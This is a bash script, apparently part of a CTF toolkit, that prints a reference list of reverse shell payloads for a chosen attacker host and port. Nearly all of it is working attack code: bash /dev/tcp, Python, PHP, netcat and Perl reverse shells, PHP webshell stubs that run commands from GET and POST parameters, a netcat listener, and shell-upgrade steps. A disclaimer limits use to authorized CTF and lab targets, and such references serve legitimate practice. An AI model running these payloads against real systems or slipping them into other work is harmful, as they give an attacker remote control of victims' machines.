#!/usr/bin/env bash
# scripts/revshell-ref.sh — Reverse shell payload reference for CTF
# NuRichter · CySec Arsenal
#
# Prints common reverse shell payloads used in CTF challenges.
# Use only on authorized CTF targets / lab machines.
#
# Usage: ./scripts/revshell-ref.sh <LHOST> <LPORT>
LHOST="${1:-10.10.14.1}"; LPORT="${2:-4444}"
CYN='\033[0;36m'; MAG='\033[0;35m'; DIM='\033[2m'; RST='\033[0m'
hdr() { echo -e "\n${CYN}  ── $* ──${RST}"; }
p()   { echo -e "  ${MAG}[payload]${RST} $1\n  ${DIM}$2${RST}"; }

echo -e "\n${CYN}  ── Reverse Shell Reference — CTF Use Only ──${RST}"
echo -e "  LHOST: $LHOST  LPORT: $LPORT\n"
echo -e "  Listener: nc -lvnp $LPORT\n"

hdr "Bash"
p "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" "direct bash redirection"
p "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'" "wrapped for command injection"
p "0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; sh <&196 >&196 2>&196" "alternate fd"

hdr "Python"
p "python3 -c \"import os,socket,subprocess;s=socket.socket();s.connect(('$LHOST',$LPORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(['/bin/sh'])\"" "python3"
p "python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('$LHOST',$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"" "python2"

hdr "PHP"
p "php -r '\$s=fsockopen(\"$LHOST\",$LPORT);\$p=proc_open(\"/bin/sh\",array(\$s,\$s,\$s),\$pi);'" "php cli"
p "<?php system(\$_GET['cmd']); ?>" "webshell stub (GET ?cmd=)"
p "<?php \$_=\$_POST['c']; system(\$_); ?>" "webshell stub (POST c=)"

hdr "Netcat"
p "nc -e /bin/sh $LHOST $LPORT" "netcat -e (traditional)"
p "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f" "mkfifo (busybox-safe)"

hdr "Perl"
p "perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'" "perl"

hdr "Shell Upgrades (after getting shell)"
echo -e "  python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
echo -e "  Ctrl+Z  →  stty raw -echo; fg"
echo -e "  export TERM=xterm; stty rows 50 columns 200"
echo ""
